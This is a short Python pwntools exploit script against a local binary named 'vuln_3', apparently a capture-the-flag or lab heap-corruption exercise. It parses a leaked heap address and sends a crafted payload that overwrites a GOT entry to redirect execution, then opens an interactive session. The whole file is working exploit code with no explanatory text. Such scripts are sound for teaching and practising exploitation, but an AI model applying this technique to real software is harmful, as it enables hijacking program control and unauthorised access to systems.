#!/usr/bin/python
from pwn import *

conn = process(['./vuln_3', 'test'])

conn.recvline()
heap=int(conn.recvline()[:-1], 10)
print(hex(heap))
conn.sendline("TEST")
conn.recvuntil("You should enter the got and the shellcode address in some specific manner... an overflow will not be very useful...");

conn.sendline(p32(heap+0x0c) + p32(0x804d02c-8) + p32(0x804d02c-8) + p8(0xff) + p8(0x25) + p32(heap+0x14) + p16(0) + p32(0x08048956))
conn.interactive()


